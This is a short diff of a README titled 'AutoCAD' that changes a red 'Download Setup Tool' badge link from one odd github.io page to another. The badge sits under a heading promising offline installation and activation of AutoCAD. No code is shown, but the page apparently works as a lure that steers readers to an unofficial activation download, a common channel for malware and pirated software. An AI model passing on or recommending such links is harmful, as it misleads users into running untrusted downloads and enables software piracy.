@@ -1,6 +1,6 @@
 # 🧮 AutoCAD 
 
-[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-red)](https://asdeennerhorse.github.io/mogus/AutoCAD)
+[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-red)](https://autocad-offline-activation-guide.github.io/.github)
 
 ## 🛠️ How to Install & Activate AutoCAD Offline
 
